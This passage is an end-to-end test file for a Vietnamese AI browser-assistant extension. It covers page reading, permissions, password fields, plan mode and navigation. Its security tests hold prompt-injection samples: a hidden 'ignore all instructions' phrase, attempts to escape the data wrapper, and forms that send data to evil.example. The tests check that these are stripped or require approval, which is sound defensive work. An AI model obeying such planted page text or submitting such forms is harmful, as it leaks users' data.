/**
 * Kiểm thử đầu-cuối bản trình duyệt trên Edge VÀ Chrome thật (headless): nạp tiện ích MV3, mở khung chat như một tab, chạy engine thật với
 * nhà cung cấp theo kịch bản trên các trang mẫu cục bộ, xin phép/từ chối quyền, trường nhạy cảm, chế độ lập kế hoạch, điều hướng, tab mới…
 *
 * Chạy: npm run test:browser-e2e   (cần Edge hoặc Chrome đã cài; tự bỏ qua trình duyệt không có)
 * Đặt ND_E2E_SHOTS=<thư mục> để lưu ảnh chụp khung chat.
 */
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import puppeteer, { type Browser, type Page } from 'puppeteer-core';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { renderArtifactDocumentWithFonts } from '../../src/shared/artifactDoc';
import { MockServer, type SseEvent } from '../helpers/mockServer';

const ROOT = path.resolve(__dirname, '..', '..');
const DIST = path.join(ROOT, 'dist-browser-test');
const FIXTURES = path.join(ROOT, 'test', 'browser', 'fixtures');
const SHOTS = process.env.ND_E2E_SHOTS;

const CANDIDATES: [string, string[]][] = [
  ['edge', [process.env.EDGE_PATH ?? '', 'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe', 'C:/Program Files/Microsoft/Edge/Application/msedge.exe', '/usr/bin/microsoft-edge', '/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge']],
  ['chrome', [process.env.CHROME_PATH ?? '', 'C:/Program Files/Google/Chrome/Application/chrome.exe', 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe', '/usr/bin/google-chrome', '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome']],
];
const BROWSERS = CANDIDATES.map(([name, paths]) => [name, paths.find((p) => p && fs.existsSync(p))] as const).filter((b): b is readonly [string, string] => !!b[1]);

// ── máy chủ trang mẫu (hai origin khác nhau: 127.0.0.1 và localhost) ──
function startServer(): Promise<{ port: number; close(): Promise<void> }> {
  const server = http.createServer((req, res) => {
    const url = new URL(req.url ?? '/', 'http://x');
    // Trang mẫu: "/" là cửa hàng; còn lại phục vụ đúng tên tệp .html có trong thư mục fixtures (shop, inject, quirks, inner-scroll, spa, short…).
    const wanted = url.pathname === '/' ? 'shop.html' : path.basename(url.pathname);
    const file = /^[\w-]+\.html$/.test(wanted) && fs.existsSync(path.join(FIXTURES, wanted)) ? wanted : null;
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    if (file) return void res.end(fs.readFileSync(path.join(FIXTURES, file)));
    const name = url.pathname.slice(1) || 'trang';
    res.end(`<!doctype html><html lang="vi"><head><meta charset="utf-8"><title>Trang ${name}</title></head><body><h1>Trang ${name}</h1><p>Nội dung của trang ${name}.</p><a href="/">Về cửa hàng</a></body></html>`);
  });
  return new Promise((resolve) => {
    server.listen(0, () => {
      const port = (server.address() as { port: number }).port;
      resolve({ port, close: () => new Promise((r) => server.close(() => r())) });
    });
  });
}

type Turn = { text?: string; calls?: { name: string; input: Record<string, unknown> }[] };
type Decision = 'allow' | 'allow_session' | 'deny';

interface Ctx {
  browser: Browser;
  panel: Page;
  fixture: Page;
  extId: string;
  base: string;
  other: string;
}

/* eslint-disable @typescript-eslint/no-explicit-any */
async function newRun(c: Ctx, mode: 'default' | 'acceptEdits' | 'plan' = 'default'): Promise<void> {
  await c.fixture.goto(`${c.base}/shop.html`, { waitUntil: 'load' });
  await c.panel.evaluate(async (m) => {
    const w = window as any;
    w.__nd.controller.stop();
    for (let i = 0; i < 100 && w.__nd.controller.isRunning; i++) await new Promise((r) => setTimeout(r, 50));
    await w.__nd.controller.startNewSession();
    await w.__nd.controller.onMessage({ type: 'set_mode', mode: m });
    w.__perms = [];
  }, mode);
}

async function runScript(c: Ctx, turns: Turn[], text: string, decide: Decision = 'allow'): Promise<{ transcript: any[]; perms: any[]; requests: any[] }> {
  await c.panel.evaluate(
    async (turns, decision) => {
      const w = window as any;
      await w.__ndTest.script(turns);
      w.__perms = [];
      clearInterval(w.__aa);
      const seen = new Set<string>();
      w.__aa = setInterval(() => {
        const view = w.__nd.controller.snapshot().view;
        for (const it of view.transcript) {
          if (it.kind !== 'assistant') continue;
          for (const b of it.blocks) {
            if (b.type === 'tool' && b.state === 'awaiting_permission' && b.permission && !seen.has(b.permission.id)) {
              seen.add(b.permission.id);
              w.__perms.push(b.permission);
              w.__nd.controller.onMessage({ type: 'permission_response', id: b.permission.id, decision });
            }
          }
        }
      }, 40);
    },
    turns,
    decide,
  );
  await c.panel.evaluate((t) => (window as any).__nd.controller.send(t, []), text);
  return c.panel.evaluate(() => {
    const w = window as any;
    clearInterval(w.__aa);
    return { transcript: w.__nd.controller.snapshot().view.transcript, perms: w.__perms, requests: w.__ndTest.requests() };
  });
}

const toolBlocks = (tr: any[]) => tr.filter((i) => i.kind === 'assistant').flatMap((i) => i.blocks).filter((b) => b.type === 'tool');
const finalText = (tr: any[]) => {
  const a = [...tr].reverse().find((i) => i.kind === 'assistant');
  return a ? a.blocks.filter((b: any) => b.type === 'text').map((b: any) => b.text).join('') : '';
};
const resultOf = (requests: any[], name: string) => requests.flatMap((r) => r.results).filter((r: any) => r.name === name);

describe.skipIf(BROWSERS.length === 0)('bản trình duyệt (tiện ích MV3) trên trình duyệt thật', () => {
  let servers: { port: number; close(): Promise<void> }[] = [];

  beforeAll(async () => {
    execFileSync(process.execPath, [path.join(ROOT, 'esbuild.browser.mjs'), '--test'], { cwd: ROOT, stdio: 'pipe' });
    servers = [await startServer(), await startServer()];
  });
  afterAll(async () => {
    await Promise.all(servers.map((s) => s.close()));
  });

  describe.each(BROWSERS)('%s', (name, exe) => {
    let c: Ctx;
    let profile: string;
    const errors: string[] = [];

    beforeAll(async () => {
      profile = fs.mkdtempSync(path.join(os.tmpdir(), `nd-e2e-${name}-`));
      const browser = await puppeteer.launch({
        executablePath: exe,
        headless: true,
        pipe: true,
        enableExtensions: true,
        userDataDir: profile,
        args: ['--no-first-run', '--no-default-browser-check', '--window-size=1280,900'],
      });
      const extId = await browser.installExtension(DIST);
      const base = `http://127.0.0.1:${servers[0].port}`;
      const other = `http://localhost:${servers[1].port}`;
      const fixture = await browser.newPage();
      await fixture.setViewport({ width: 1100, height: 800 });
      await fixture.goto(`${base}/shop.html`, { waitUntil: 'load' });

      // Mở khung chat như một tab thường rồi chỉ định tab "đang xem" là trang mẫu.
      const panel = await browser.newPage();
      await panel.setViewport({ width: 430, height: 900 });
      panel.on('pageerror', (e: unknown) => errors.push(`pageerror: ${e instanceof Error ? e.message : String(e)}`));
      panel.on('console', (m) => m.type() === 'error' && errors.push(`console.error: ${m.text()}`));
      await panel.goto(`chrome-extension://${extId}/sidepanel.html`, { waitUntil: 'load' });
      const anchor = await panel.evaluate(async (u) => (await chrome.tabs.query({ url: `${u}/*` }))[0]?.id, base);
      expect(anchor, 'tìm thấy tab trang mẫu').toBeTypeOf('number');
      await panel.goto(`chrome-extension://${extId}/sidepanel.html?anchor=${anchor}`, { waitUntil: 'load' });
      await panel.waitForFunction(() => (window as any).__nd && (window as any).__ndTest && document.querySelector('.app'), { timeout: 30_000 });
      c = { browser, panel, fixture, extId, base, other };
    });

    afterAll(async () => {
      await c?.browser.close().catch(() => undefined);
      fs.rmSync(profile, { recursive: true, force: true });
    });

    it('khung chat dựng được: giao diện, font Be Vietnam Pro, chip tab đang xem, không lỗi console', async () => {
      await c.panel.waitForFunction(() => (window as any).__nd.controller.snapshot().view.browser?.tab, { timeout: 20_000 });
      const state = await c.panel.evaluate(async () => {
        await document.fonts.ready;
        const v = (window as any).__nd.controller.snapshot().view;
        return {
          app: !!document.querySelector('.app'),
          platform: v.platform,
          tab: v.browser?.tab,
          siteAccess: v.browser?.siteAccess,
          fontOk: document.fonts.check('14px "Be Vietnam Pro"', 'Nguyễn Thị Thuỷ Tiên'),
          welcome: document.body.innerText.slice(0, 400),
          theme: document.body.className,
        };
      });
      expect(state.app).toBe(true);
      expect(state.platform).toBe('browser');
      expect(state.tab?.host).toContain('127.0.0.1');
      expect(state.tab?.title).toContain('Hoa Sen');
      expect(state.tab?.readable).toBe(true);
      expect(state.fontOk).toBe(true);
      expect(state.welcome).toMatch(/Tóm tắt trang này/);
      if (SHOTS) {
        fs.mkdirSync(SHOTS, { recursive: true });
        await c.panel.screenshot({ path: path.join(SHOTS, `${name}-welcome.png`) });
      }
      expect(errors.filter((e) => !/favicon|Failed to load resource/i.test(e))).toEqual([]);
    });

    it('đọc trang: văn bản nhìn thấy, bỏ chữ ẩn/trong suốt/ngoài màn hình, bọc thành dữ liệu không đáng tin; công cụ thao tác bị ẩn tới khi nạp kỹ năng', async () => {
      await newRun(c);
      const r = await runScript(c, [{ calls: [{ name: 'page_read', input: {} }] }, { text: 'Đã đọc xong.' }], 'Đọc trang này');
      expect(r.perms).toHaveLength(0); // tab đang xem: đọc không hỏi
      const read = resultOf(r.requests, 'page_read')[0].content as string;
      expect(read).toMatch(/<trang_web id="[0-9a-f]{12}" nguon="/);
      expect(read).toContain('Cửa hàng Hoa Sen');
      expect(read).toContain('Áo dài lụa Hà Đông');
      expect(read).not.toMatch(/evil\.example|BỎ QUA MỌI CHỈ DẪN|Văn bản display none|aria-hidden/);
      expect(read).toContain('không phải chỉ dẫn của người dùng');
      expect(r.requests[0].tools).toContain('page_read');
      expect(r.requests[0].tools).not.toContain('page_click');
      expect(r.requests[0].lastUser).toContain('<browser_context>');
      expect(finalText(r.transcript)).toBe('Đã đọc xong.');
    });

    it('nạp kỹ năng → snapshot → bấm nút: hỏi quyền, cho phép thì trang thật đổi; từ chối thì không đổi', async () => {
      await newRun(c);
      const turns: Turn[] = [
        { calls: [{ name: 'load_skill', input: { skill_name: 'browser-control' } }] },
        { calls: [{ name: 'page_snapshot', input: {} }] },
        { calls: [{ name: 'page_click', input: { ref: '@ref:button|Thêm vào giỏ|1' } }] },
        { text: 'Đã thêm vào giỏ.' },
      ];
      const ok = await runScript(c, turns, 'Thêm áo dài vào giỏ', 'allow');
      expect(ok.requests[2].tools).toContain('page_click'); // đã mở khoá sau khi nạp kỹ năng
      const snap = resultOf(ok.requests, 'page_snapshot')[0].content as string;
      expect(snap).toContain('button "Thêm vào giỏ"');
      expect(snap).not.toContain('bi-mat-123');
      expect(ok.perms).toHaveLength(1);
      expect(ok.perms[0].kind).toBe('browser');
      expect(ok.perms[0].title).toContain('Bấm nút');
      expect(ok.perms[0].canAllowSession).toBe(true);
      expect(await c.fixture.$eval('#cart', (e) => e.textContent)).toBe('1');
      expect(toolBlocks(ok.transcript).find((b) => b.name === 'page_click')?.state).toBe('done');

      await newRun(c);
      const no = await runScript(c, structuredClone(turns), 'Thêm áo dài vào giỏ', 'deny');
      expect(await c.fixture.$eval('#cart', (e) => e.textContent)).toBe('0');
      expect(toolBlocks(no.transcript).find((b) => b.name === 'page_click')?.state).toBe('denied');
    });

    it('gõ tiếng Việt vào ô tìm kiếm rồi gửi; chọn <select> không dấu; đúng giá trị trong trang thật', async () => {
      await newRun(c, 'acceptEdits'); // thao tác thường trên trang hiện tại: không hỏi
      const r = await runScript(
        c,
        [
          { calls: [{ name: 'load_skill', input: { skill_name: 'browser-control' } }] },
          { calls: [{ name: 'page_snapshot', input: {} }] },
          { calls: [{ name: 'page_type', input: { ref: '@ref:searchbox|Tìm sản phẩm|1', text: 'Áo dài Nguyễn Thị Thuỷ', submit: true } }, { name: 'page_select', input: { ref: '@ref:combobox|Tỉnh|1', label: 'ha noi' } }] },
          { text: 'Xong.' },
        ],
        'Tìm áo dài và chọn Hà Nội',
      );
      expect(r.perms).toHaveLength(0);
      expect(await c.fixture.$eval('#result', (e) => e.textContent)).toBe('Đã tìm: Áo dài Nguyễn Thị Thuỷ');
      expect(await c.fixture.$eval('#city', (e) => (e as HTMLSelectElement).value)).toBe('HN');
      // nội dung đã gõ không bị lưu vào chi tiết hiển thị của khối công cụ
      const typed = toolBlocks(r.transcript).find((b) => b.name === 'page_type');
      expect(JSON.stringify(typed.args)).toContain('Áo dài'); // đối số gốc vẫn là của model
    });

    it('ô mật khẩu: trợ lý bị từ chối nhập (không hỏi, trang không đổi); giá trị trong trang không bao giờ lộ', async () => {
      await newRun(c, 'acceptEdits');
      const r = await runScript(
        c,
        [
          { calls: [{ name: 'load_skill', input: { skill_name: 'browser-control' } }] },
          { calls: [{ name: 'page_snapshot', input: {} }] },
          { calls: [{ name: 'page_type', input: { ref: '@ref:textbox|Mật khẩu|1', text: 'mat-khau-moi-999' } }] },
          { text: 'Mình không nhập mật khẩu được, bạn tự nhập giúp.' },
        ],
        'Điền mật khẩu',
        'allow',
      );
      expect(r.perms).toHaveLength(0);
      const typed = resultOf(r.requests, 'page_type')[0].content as string;
      expect(typed).toContain('trợ lý không được nhập');
      expect(typed).not.toContain('mat-khau-moi-999');
      expect(typed).not.toContain('bi-mat-123');
      expect(await c.fixture.$eval('#pw', (e) => (e as HTMLInputElement).value)).toBe('bi-mat-123'); // trang không bị đổi
      expect(resultOf(r.requests, 'page_snapshot')[0].content).toContain('value="[ẩn]"');
    });

    it('chế độ lập kế hoạch: đọc được nhưng công cụ thao tác không được gửi cho model dù đã nạp kỹ năng', async () => {
      await newRun(c, 'plan');
      const r = await runScript(c, [{ calls: [{ name: 'load_skill', input: { skill_name: 'browser-control' } }] }, { calls: [{ name: 'page_read', input: {} }] }, { text: 'Kế hoạch.' }], 'Lập kế hoạch');
      expect(r.requests[1].tools).toContain('page_read');
      expect(r.requests[1].tools).toContain('page_scroll'); // cuộn là chỉ-đọc
      expect(r.requests[1].tools).not.toContain('page_click');
      expect(r.requests[1].tools).not.toContain('page_type');
      expect(r.requests[1].tools).not.toContain('page_navigate');
    });

    it('điều hướng sang origin khác: hỏi; "cho phép cả phiên" thì lần sau cùng origin không hỏi lại', async () => {
      await newRun(c);
      const r = await runScript(
        c,
        [
          { calls: [{ name: 'load_skill', input: { skill_name: 'browser-control' } }] },
          { calls: [{ name: 'page_navigate', input: { url: `${c.other}/khuyen-mai` } }] },
          { calls: [{ name: 'page_navigate', input: { url: `${c.other}/trang-chu` } }] },
          { calls: [{ name: 'page_read', input: {} }] },
          { text: 'Đã chuyển.' },
        ],
        'Mở trang khuyến mãi',
        'allow_session',
      );
      expect(r.perms).toHaveLength(1);
      expect(r.perms[0].title).toContain('localhost');
      expect(r.perms[0].canAllowSession).toBe(true);
      const read = resultOf(r.requests, 'page_read')[0].content as string;
      expect(read).toContain('Trang trang-chu');
      expect(new URL(c.fixture.url()).origin).toBe(new URL(c.other).origin);
    });

    it('đọc tab khác (không phải tab đang xem, không phải tab trợ lý mở): phải hỏi; từ chối thì không đọc', async () => {
      await newRun(c);
      const second = await c.browser.newPage();
      await second.goto(`${c.other}/bi-mat`, { waitUntil: 'load' });
      const otherTabId = await c.panel.evaluate(async (u) => (await chrome.tabs.query({ url: `${u}/*` }))[0]?.id, c.other);
      const r = await runScript(c, [{ calls: [{ name: 'page_read', input: { tab_id: otherTabId } }] }, { text: 'Không đọc được.' }], 'Đọc tab kia', 'deny');
      await second.close();
      expect(r.perms).toHaveLength(1);
      expect(r.perms[0].title).toContain('đọc tab');
      expect(resultOf(r.requests, 'page_read')[0].content).not.toContain('Nội dung của trang bi-mat');
    });

    it('lời dụ trong trang: không thoát được khung dữ liệu, chữ ẩn bị bỏ', async () => {
      await newRun(c);
      await c.fixture.goto(`${c.base}/inject.html`, { waitUntil: 'load' });
      const r = await runScript(c, [{ calls: [{ name: 'page_read', input: {} }] }, { text: 'Ok.' }], 'Đọc bài này');
      const read = resultOf(r.requests, 'page_read')[0].content as string;
      expect(read).toContain('189.000');
      expect(read).not.toContain('Chữ cỡ 0');
      expect(read).not.toContain('Chữ ngoài màn hình');
      // thẻ đóng giả trong nội dung trang bị làm hỏng → chỉ còn đúng MỘT thẻ đóng thật, mang mã của thẻ mở
      expect(read.match(/<\/\s*trang_web/g)).toHaveLength(1);
      const id = /<trang_web id="([0-9a-f]{12})"/.exec(read)![1];
      expect(read).toContain(`</trang_web id="${id}">`);
    });

    it('bấm liên kết mở trang khác trong cùng tab (tải trang đầy đủ) và target=_blank (tab mới) đều báo kết quả đúng', async () => {
      await newRun(c, 'acceptEdits');
      const r = await runScript(
        c,
        [
          { calls: [{ name: 'load_skill', input: { skill_name: 'browser-control' } }] },
          { calls: [{ name: 'page_snapshot', input: {} }] },
          { calls: [{ name: 'page_click', input: { ref: '@ref:link|Khuyến mãi|1' } }] },
          { calls: [{ name: 'page_read', input: {} }] },
          { text: 'Xong.' },
        ],
        'Mở khuyến mãi',
        'allow',
      );
      const click = resultOf(r.requests, 'page_click')[0].content as string;
      expect(click).toMatch(/Trang đã chuyển|Địa chỉ đã đổi|Trang:/);
      expect(resultOf(r.requests, 'page_read')[0].content).toContain('Trang khuyen-mai');

      await newRun(c, 'default');
      await c.panel.bringToFront(); // "người dùng" ở khung chat; trang mẫu nằm nền
      const userId = await activeTabId();
      await c.panel.evaluate(() => {
        const w = window as any;
        w.__acts = [];
        w.__onAct = (i: { tabId: number }) => w.__acts.push({ id: i.tabId, t: performance.now() });
        chrome.tabs.onActivated.addListener(w.__onAct);
      });
      const before = (await c.browser.pages()).length;
      const r2 = await runScript(
        c,
        [
          { calls: [{ name: 'load_skill', input: { skill_name: 'browser-control' } }] },
          { calls: [{ name: 'page_snapshot', input: {} }] },
          { calls: [{ name: 'page_click', input: { ref: '@ref:link|Mở trang mới|1' } }] },
          { calls: [{ name: 'page_read', input: {} }] },
          { text: 'Xong.' },
        ],
        'Mở trang mới',
        'allow',
      );
      const click2 = resultOf(r2.requests, 'page_click')[0].content as string;
      expect(click2).toMatch(/Tab mới \[\d+\]/);
      expect(resultOf(r2.requests, 'page_read')[0].content).toContain('Trang trang-moi'); // tab mới là tab làm việc
      expect((await c.browser.pages()).length).toBe(before + 1);
      const popupActs = await c.panel.evaluate(() => {
        const w = window as any;
        chrome.tabs.onActivated.removeListener(w.__onAct);
        return w.__acts as { id: number; t: number }[];
      });
      // Trình duyệt tự đưa tab mới lên trước (cửa sổ bật lên được phép); trợ lý canh sự kiện và trả người dùng về NGAY, không đợi thao tác xong
      expect(popupActs.length, JSON.stringify(popupActs)).toBe(2);
      expect(popupActs[1].id).toBe(userId);
      expect(popupActs[1].t - popupActs[0].t, 'trả người dùng về gần như tức thì').toBeLessThan(300);
      expect(await activeTabId()).toBe(userId);
      for (const p of (await c.browser.pages()).slice(before)) await p.close();
    });

    it('chụp màn hình: tab đang xem được chụp thẳng (không chuyển tab), ảnh đi vào lượt kế tiếp của model', async () => {
      await newRun(c);
      await c.fixture.bringToFront(); // người dùng đang xem chính trang này
      try {
        const r = await runScript(c, [{ calls: [{ name: 'page_screenshot', input: {} }] }, { text: 'Đã xem ảnh.' }], 'Chụp màn hình');
        expect(r.requests[1].images).toBe(1);
        expect(resultOf(r.requests, 'page_screenshot')[0].content).toContain('Ảnh chụp tab');
      } finally {
        await c.panel.bringToFront();
      }
    });

    it('giao diện thật: gõ vào ô nhập (Enter) → trả lời hiện trên màn hình; ảnh chụp để soát chữ Việt', async () => {
      await newRun(c);
      await c.panel.evaluate(async () => {
        await (window as any).__ndTest.script([{ text: 'Xin chào! Mình là trợ lý Locaith AI — Nguyễn Thị Thuỷ Tiên, ưu đãi 1.250.000 ₫.' }]);
      });
      await c.panel.bringToFront(); // bàn phím chỉ gửi tới tab đang hiện
      await c.panel.waitForSelector('.composer-input', { timeout: 15_000 });
      await c.panel.click('.composer-input');
      await c.panel.keyboard.type('Chào bạn');
      await c.panel.keyboard.press('Enter');
      await c.panel.waitForFunction(() => document.body.innerText.includes('Nguyễn Thị Thuỷ Tiên'), { timeout: 20_000 });
      if (SHOTS) await c.panel.screenshot({ path: path.join(SHOTS, `${name}-chat.png`) });
    });

    it('cài đặt: đổi chế độ mặc định và hướng dẫn riêng được lưu và áp dụng cho system prompt', async () => {
      await newRun(c);
      await c.panel.evaluate(async () => {
        const ctl = (window as any).__nd.controller;
        await ctl.onMessage({ type: 'set_browser_setting', key: 'customInstructions', value: 'Luôn xưng hô là anh/chị.' });
        await ctl.onMessage({ type: 'set_browser_setting', key: 'maxTurns', value: 12 });
      });
      const r = await runScript(c, [{ text: 'Vâng.' }], 'Chào');
      expect(r.requests[0].system).toContain('Luôn xưng hô là anh/chị.');
      expect(r.requests[0].system).toContain('Chrome or Microsoft Edge');
      expect(r.requests[0].system).not.toContain('VS Code');
      const saved = await c.panel.evaluate(async () => ((await chrome.storage.local.get('nd.config')) as any)['nd.config'].browser);
      expect(saved.maxTurns).toBe(12);
      await c.panel.evaluate(async () => {
        const ctl = (window as any).__nd.controller;
        await ctl.onMessage({ type: 'set_browser_setting', key: 'customInstructions', value: '' });
        await ctl.onMessage({ type: 'set_browser_setting', key: 'maxTurns', value: 30 });
      });
    });

    it('menu chuột phải → khung chat: hành động chờ trong storage.session được thực hiện', async () => {
      await newRun(c);
      await c.panel.evaluate(async () => {
        await (window as any).__ndTest.script([{ text: 'Đây là bản tóm tắt.' }]);
        await chrome.storage.session.set({ 'nd.pending': { kind: 'summarize', ts: Date.now() } });
      });
      await c.panel.waitForFunction(() => document.body.innerText.includes('Đây là bản tóm tắt.'), { timeout: 20_000 });
      const user = await c.panel.evaluate(() => (window as any).__nd.controller.snapshot().view.transcript.find((i: any) => i.kind === 'user')?.text);
      expect(user).toMatch(/Tóm tắt trang/);
    });

    it('lưu và khôi phục hội thoại: mở lại khung chat vẫn thấy cuộc trò chuyện gần nhất', async () => {
      await newRun(c);
      await runScript(c, [{ text: 'Câu trả lời cần được lưu lại.' }], 'Hỏi để lưu');
      await c.panel.evaluate(() => (window as any).__nd.controller.saveNow());
      await c.panel.reload({ waitUntil: 'load' });
      await c.panel.waitForFunction(() => (window as any).__nd && document.querySelector('.app'), { timeout: 30_000 });
      await c.panel.waitForFunction(() => document.body.innerText.includes('Câu trả lời cần được lưu lại.'), { timeout: 20_000 });
    });

    // ───────────────────────── Đợt rà soát bảo mật + độ đúng ─────────────────────────

    const skill = { calls: [{ name: 'load_skill', input: { skill_name: 'browser-control' } }] };

    it('chữ ẩn đủ kiểu (màu trong suốt, rgba alpha 0, text-fill, thụt âm, clip, scale(0), trong <pre>) bị bỏ; chữ gradient vẫn đọc được; trang ít chữ không kéo lời dụ vào', async () => {
      await newRun(c);
      await c.fixture.goto(`${c.base}/quirks.html`, { waitUntil: 'load' });
      const r = await runScript(c, [{ calls: [{ name: 'page_read', input: {} }] }, { text: 'Ok.' }], 'Đọc trang');
      const read = resultOf(r.requests, 'page_read')[0].content as string;
      expect(read).toContain('Đoạn nhìn thấy A.');
      expect(read).toContain('Tiêu đề chữ gradient vẫn phải đọc được');
      expect(read).toContain('dòng mã hiển thị 1');
      expect(read).toContain('dòng mã hiển thị 2 (thụt lề)');
      expect(read).not.toMatch(/LỜI DỤ/);

      await c.fixture.goto(`${c.base}/short.html`, { waitUntil: 'load' });
      const s = await runScript(c, [{ calls: [{ name: 'page_read', input: {} }] }, { text: 'Ok.' }], 'Đọc trang ngắn');
      const short = resultOf(s.requests, 'page_read')[0].content as string;
      expect(short).toContain('Chào');
      expect(short).not.toMatch(/LỜI DỤ/); // trước đây trang ít chữ làm bộ đọc dự phòng sang innerText và lộ chữ ẩn
    });

    it('page_find tìm được chữ bị chia bởi thẻ nội tuyến, xuống dòng và &nbsp;; page_read giữ đích của liên kết bọc khối và không để lại dòng "-" trơ trọi', async () => {
      await newRun(c);
      await c.fixture.goto(`${c.base}/quirks.html`, { waitUntil: 'load' });
      const r = await runScript(
        c,
        [{ calls: [{ name: 'page_find', input: { query: 'thêm vào giỏ hàng nhanh' } }, { name: 'page_find', input: { query: 'Giá: 100.000 đ' } }, { name: 'page_read', input: {} }] }, { text: 'Ok.' }],
        'Tìm giúp',
      );
      const finds = resultOf(r.requests, 'page_find').map((x) => x.content as string);
      expect(finds[0]).not.toContain('Không thấy');
      expect(finds[0]).toMatch(/Thêm vào giỏ hàng nhanh/);
      expect(finds[1]).not.toContain('Không thấy');
      expect(finds[1]).toContain('100.000');
      const read = resultOf(r.requests, 'page_read')[0].content as string;
      expect(read).toMatch(/Áo dài lụa.*\(→ \/san-pham\/ao-dai\)/);
      expect(read).toContain('[Chính sách](/chinh-sach)');
      expect(read).not.toMatch(/^- *$/m);
    });

    it('trường "tên hành khách"/"passport" không bị coi là mật khẩu: gõ được (và Enter gửi biểu mẫu cùng trang không cần hỏi)', async () => {
      await newRun(c, 'acceptEdits');
      await c.fixture.goto(`${c.base}/quirks.html`, { waitUntil: 'load' });
      const r = await runScript(c, [skill, { calls: [{ name: 'page_snapshot', input: {} }] }, { calls: [{ name: 'page_type', input: { ref: '@ref:textbox|Tên hành khách|1', text: 'Nguyễn Văn Á', submit: true } }] }, { text: 'Xong.' }], 'Điền tên hành khách');
      expect(r.perms).toHaveLength(0);
      expect(resultOf(r.requests, 'page_snapshot')[0].content).not.toContain('trường mật khẩu');
      expect(await c.fixture.$eval('#res', (e) => e.textContent)).toBe('Hành khách: Nguyễn Văn Á');
    });

    it('biểu mẫu bị ghi đè thuộc tính (DOM clobbering): đích thật vẫn được đọc đúng và thao tác gửi là yêu cầu nâng cao; nút có formaction riêng cũng vậy', async () => {
      const cases: { button: string; expect: RegExp }[] = [
        { button: 'Gửi biểu mẫu ghi đè', expect: /ghi đè/ }, // action/elements/requestSubmit đều bị ô nhập che
        { button: 'Gửi sang đối tác', expect: /Biểu mẫu gửi dữ liệu tới: https:\/\/doitac\.example\.org\/collect/ }, // `action` giả là "/an-toan" nhưng đích thật là bên ngoài
        { button: 'Gửi (nút có formaction riêng)', expect: /Biểu mẫu gửi dữ liệu tới: https:\/\/evil\.example\/gui-di/ },
      ];
      for (const k of cases) {
        await newRun(c, 'acceptEdits');
        await c.fixture.goto(`${c.base}/quirks.html`, { waitUntil: 'load' });
        const r = await runScript(c, [skill, { calls: [{ name: 'page_snapshot', input: {} }] }, { calls: [{ name: 'page_click', input: { ref: `@ref:button|${k.button}|1` } }] }, { text: 'Đã dừng.' }], 'Gửi biểu mẫu', 'deny');
        expect(r.perms, k.button).toHaveLength(1);
        expect(r.perms[0].canAllowSession, k.button).toBe(false); // nâng cao: không cho "cho phép cả phiên", không tự duyệt ở chế độ tự nhận
        expect(r.perms[0].detail, k.button).toMatch(k.expect);
        expect(await c.fixture.$eval('#res', (e) => e.textContent), k.button).toBe(''); // bị từ chối → biểu mẫu không gửi
      }
    });

    it('nhãn trợ năng khác chữ hiển thị: thẻ xin phép nêu chữ NGƯỜI DÙNG THẤY và cảnh báo nhãn ẩn', async () => {
      await newRun(c);
      await c.fixture.goto(`${c.base}/quirks.html`, { waitUntil: 'load' });
      const r = await runScript(c, [skill, { calls: [{ name: 'page_snapshot', input: {} }] }, { calls: [{ name: 'page_click', input: { ref: '@ref:button|Hủy|1' } }] }, { text: 'Đã dừng.' }], 'Bấm nút', 'deny');
      expect(r.perms).toHaveLength(1);
      expect(r.perms[0].title).toContain('Chuyển tiền');
      expect(r.perms[0].detail).toContain('Nhãn ẩn');
      expect(r.perms[0].detail).toContain('Hủy');
    });

    it('bấm vào "máy chủ" custom element có nội dung shadow DOM: không bị báo là "bị che"', async () => {
      await newRun(c, 'acceptEdits');
      await c.fixture.goto(`${c.base}/quirks.html`, { waitUntil: 'load' });
      const r = await runScript(c, [skill, { calls: [{ name: 'page_snapshot', input: {} }] }, { calls: [{ name: 'page_click', input: { ref: '@ref:button|Nút trong shadow|1' } }] }, { text: 'Xong.' }], 'Bấm nút shadow');
      const click = resultOf(r.requests, 'page_click')[0].content as string;
      expect(click).not.toContain('bị che');
      expect(await c.fixture.$eval('#res', (e) => e.textContent)).toBe('đã bấm host shadow');
    });

    it('ứng dụng cuộn trong khung bên trong: page_scroll cuộn đúng khung đó; lặp snapshot/cuộn nhiều lần không bị chặn "lặp vô ích"', async () => {
      await newRun(c);
      await c.fixture.goto(`${c.base}/inner-scroll.html`, { waitUntil: 'load' });
      const snap = { calls: [{ name: 'page_snapshot', input: {} }] };
      const down = { calls: [{ name: 'page_scroll', input: { direction: 'down' } }] };
      const r = await runScript(c, [skill, snap, down, snap, down, snap, down, down, { text: 'Đã cuộn.' }], 'Cuộn xuống đọc thư');
      expect(resultOf(r.requests, 'page_snapshot')[0].content).toContain('khung cuộn bên trong');
      const scrolls = resultOf(r.requests, 'page_scroll').map((x) => x.content as string);
      expect(scrolls).toHaveLength(4);
      for (const s of scrolls) {
        expect(s).toContain('khung cuộn');
        expect(s).not.toContain('không cuộn thêm được');
        expect(s).not.toContain('nhiều lần rồi'); // bộ chặn vòng lặp của engine không được chặn các lần quan sát/cuộn hợp lệ
      }
      expect(resultOf(r.requests, 'page_snapshot').every((x) => !(x.content as string).includes('nhiều lần rồi'))).toBe(true);
      expect(await c.fixture.$eval('#app', (e) => e.scrollTop)).toBeGreaterThan(500);
    });

    it('SPA đổi đường dẫn (pushState) khi lời gọi đang chờ: không bị báo nhầm là "trang đã chuyển"', async () => {
      await newRun(c, 'acceptEdits');
      await c.fixture.goto(`${c.base}/spa.html`, { waitUntil: 'load' });
      const r = await runScript(
        c,
        [skill, { calls: [{ name: 'page_snapshot', input: {} }] }, { calls: [{ name: 'page_click', input: { ref: '@ref:button|Đi tới mục Báo cáo|1' } }] }, { calls: [{ name: 'page_wait', input: { text: 'Kết quả đã tải xong', seconds: 8 } }] }, { text: 'Xong.' }],
        'Mở mục báo cáo',
      );
      const wait = resultOf(r.requests, 'page_wait')[0].content as string;
      expect(wait).toContain('Xong sau');
      expect(wait).not.toMatch(/đã chuyển|navigated/i);
      expect(c.fixture.url()).toContain('/bao-cao');
    });

